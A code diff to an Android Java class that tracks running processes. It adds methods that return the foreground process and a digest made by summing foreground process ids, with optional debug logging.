@@ -12,6 +12,7 @@ package com.android.networking;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
+import java.util.zip.Adler32;
 
 import android.app.ActivityManager;
 import android.app.ActivityManager.RunningAppProcessInfo;
@@ -89,6 +90,33 @@ public class RunningProcesses {
 
 	public synchronized ArrayList<ActivityManager.RunningAppProcessInfo> getProcessList() {
 		return list;
+	}
+	
+	public RunningAppProcessInfo getForeground() {		
+		RunningAppProcessInfo ret = null;
+		for(RunningAppProcessInfo appProcess : list){
+		    if(appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND){
+		    	if (Cfg.DEBUG) {
+					Check.log(TAG + " (getForeground): " + appProcess.processName + " pid: " + appProcess.pid);
+				}
+		    	ret= appProcess;
+		    }
+		}
+		return ret;
+	}
+	
+	public int getForegroundDigest() {		
+		
+		int ret = 0;
+		for(RunningAppProcessInfo appProcess : list){
+		    if(appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND){
+		    	if (Cfg.DEBUG) {
+					//Check.log(TAG + " (getForeground): " + appProcess.processName + " pid: " + appProcess.pid);
+				}
+		    	ret+=appProcess.pid;
+		    }
+		}
+		return ret;
 	}
 
 	public int getForegroundPid() {
